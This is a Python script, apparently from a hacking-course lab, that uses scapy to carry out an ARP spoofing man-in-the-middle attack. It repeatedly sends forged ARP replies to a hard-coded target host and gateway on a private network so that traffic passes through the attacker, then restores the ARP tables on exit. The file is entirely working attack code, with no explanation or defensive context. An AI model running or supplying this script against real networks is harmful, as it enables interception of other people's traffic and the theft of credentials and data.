import scapy.all as scapy
import time
import sys

def get_mac(ip):
    # scapy.arping(ip)
    arp_request = scapy.ARP(pdst=ip)
    # arp_request.show()
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()
    arp_request_broadcast = broadcast / arp_request
    # arp_request_broadcast.show()
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    # print("IP\t\t\t\tMAC Address\n-------------------------------------")
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):

    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.137.128"
gateway_ip = "192.168.137.2"

sent_packet_count = 0


try:

    while True:

        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count += 2
        print("\r[+] packets sent: "+ str(sent_packet_count), end='')
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print('[+] Detect Ctrl C ......Quitting.')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)